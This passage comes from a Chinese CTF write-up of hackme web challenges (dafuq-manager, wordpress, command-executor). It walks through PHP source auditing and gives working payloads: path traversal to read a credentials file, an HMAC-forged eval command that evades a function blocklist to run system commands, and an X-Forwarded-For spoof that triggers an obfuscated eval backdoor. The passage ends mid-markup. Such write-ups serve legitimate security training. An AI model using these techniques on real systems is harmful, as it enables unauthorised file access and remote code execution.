class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">        show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们跟进fun_admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($action2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"chpwd"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            changepwd($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"adduser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            adduser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edituser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            edituser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rmuser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            removeuser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            admin($admin, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的限制条件在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">$admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>我们跟进这个变量看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_user"</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_pass"</span>] = $data[<span class="number">1</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_dir"</span>] = $data[<span class="number">2</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_url"</span>] = $data[<span class="number">3</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"show_hidden"</span>] = $data[<span class="number">4</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"no_access"</span>] = $data[<span class="number">5</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再定位到find_user()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p><p>在fun_down.php文件中可以找到一个readfile()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $browser = id_browser();</span><br><span class="line">    header(<span class="string">'Content-Type: '</span> . (($browser == <span class="string">'IE'</span> || $browser == <span class="string">'OPERA'</span>) ? <span class="string">'application/octetstream'</span> : <span class="string">'application/octet-stream'</span>));</span><br><span class="line">    header(<span class="string">'Expires: '</span> . gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">    header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($abs_item));</span><br><span class="line">    <span class="keyword">if</span> ($browser == <span class="string">'IE'</span>) &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: no-cache'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目过滤部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $fname = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">        $fname2 = get_abs_item($dir, $item);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">        savefile($dir, $fname2);</span><br><span class="line">        $fname = $fname2;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp === <span class="keyword">false</span>) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"openfile"</span>]);</span><br><span class="line">    $s_item = get_rel_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (strlen($s_item) &gt; <span class="number">50</span>) $s_item = <span class="string">"..."</span> . substr($s_item, <span class="number">-47</span>);</span><br><span class="line">    show_header($GLOBALS[<span class="string">"messages"</span>][<span class="string">"actedit"</span>] . <span class="string">": /"</span> . $s_item);</span><br></pre></td></tr></table></figure><p>函数中有三条过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'help'</span>] == <span class="string">'me'</span>) &#123;</span><br><span class="line">        $_COOKIE[<span class="string">'help'</span>] = <span class="keyword">null</span>;</span><br><span class="line">        setcookie(<span class="string">'help'</span>, <span class="string">''</span>, time() - <span class="number">9999999999</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Very good. You know how to create cookie. How about tamper a cookie?")&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">'show_hidden'</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">'show_hidden'</span>, <span class="string">'no'</span>, time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($item, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span> &amp;&amp; $GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span> &amp;&amp; $_COOKIE[<span class="string">'show_hidden'</span>] != <span class="string">'yes'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"no_access"</span>] != <span class="string">""</span> &amp;&amp; @eregi($GLOBALS[<span class="string">"no_access"</span>], $item)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">        <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p><p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=../../../../../var/www/webhdisk/.config/.htusers.php&amp;order=name&amp;srt=yes&amp;lang=en</span><br></pre></td></tr></table></figure><p>于是可以读到目标文件</p><p><img src="/2018/08/28/hackme/3.png" alt=".htusers.php"></p><p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p><h1 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h1><p>题目给出了信息</p><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以自己生成command</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3"</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(make_command(<span class="string">'$a=\'sys\';$b=\'tem\';$c=$a.$b;$c(base64_decode(\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\'));'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&amp;dir[]=admin&amp;command=JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order=name&amp;srt=yes&amp;lang=en</span><br></pre></td></tr></table></figure><p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p><h1 id="wordpress-1"><a href="#wordpress-1" class="headerlink" title="wordpress 1"></a>wordpress 1</h1><p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line"><span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"><span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wp.hackme.inndy.tw/?passw0rd=cat%20flag</span><br></pre></td></tr></table></figure><p>查看元素即可找到flag</p><h1 id="wordpress-2"><a href="#wordpress-2" class="headerlink" title="wordpress 2"></a>wordpress 2</h1><p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- debug:<span class="meta">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class="string">'post_'</span>.(string)($_GET[<span class="string">'debug'</span>]?:<span class="string">'type'</span>)&#125;); <span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure><p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wp.hackme.inndy.tw/archives/date/2013/10?s=&amp;debug=content</span><br></pre></td></tr></table></figure><h1 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h1><p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p><figure class="highlight 